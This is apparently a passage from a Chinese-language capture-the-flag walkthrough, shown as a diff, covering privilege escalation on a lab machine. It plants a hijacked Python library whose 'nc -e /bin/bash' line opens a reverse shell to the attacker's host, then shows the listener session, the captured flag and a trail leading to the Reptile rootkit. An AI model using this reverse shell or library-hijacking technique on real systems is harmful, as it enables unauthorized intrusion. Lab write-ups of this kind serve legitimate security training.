@@ -109,3 +109,48 @@ tignasse@kuus:~$ sudo -l
     (mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py
 
 ```
+tignasse 用户下，可以看到mister_b 用户有个特权脚本
+game.py文件由用户mister_b所有，它导入3 个库。可以看到导入的库使用了可能被滥用的相对路径。
+1、我们在/opt/games内创建一个名为random.py的文件，其中包含以下内容：
+```
+import os 
+os.system("nc -e /bin/bash 192.168.44.128 9000")
+```
+2.、将/opt/games添加到PATH：
+通过 python 库劫持进行的权限升级，因为 python 会搜索它导入的库，这些库通常是 PATH 中第一个的库，这就是我们在PATH之前添加/opt/games的原因。
+3、最后我们使用nc 监听 2334端口，然后使用sudo 执行该脚本后，成功获取mister_b权限
+
+```c
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 9000
+listening on [any] 9000 ...
+connect to [192.168.44.128] from (UNKNOWN) [192.168.44.10] 4315
+id
+uid=1001(mister_b) gid=1001(mister_b) groups=1001(mister_b)
+script /dev/null -c bash
+Script started, file is /dev/null
+
+
+mister_b@kuus:~$ cat user.txt
+cat user.txt
+Ciphura
+
+```
+
+历史记录发现执行了一个二进制文件
+```c
+mister_b@kuus:~$ cat .bash_history
+cat .bash_history
+ps -aux |grep root
+ss -altp
+sudo -l
+find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+./sandfly-processdecloak
+exit
+
+```
+sandfly-processdecloak是一个实用程序，用于快速扫描被常见和不常见的可加载内核模块隐形 Rootkit 隐藏的 Linux 进程 ID (PID)，并将其隐藏起来，使它们可见。比如：Diamorphine, Reptile and variants
+
+编译了一个上传上去执行并没有看到隐藏进程，后面找了一下reptile项目，发现reptile 文件夹也是隐藏的。
+
+https://github.com/f0rb1dd3n/Reptile/wiki/Local-Usage
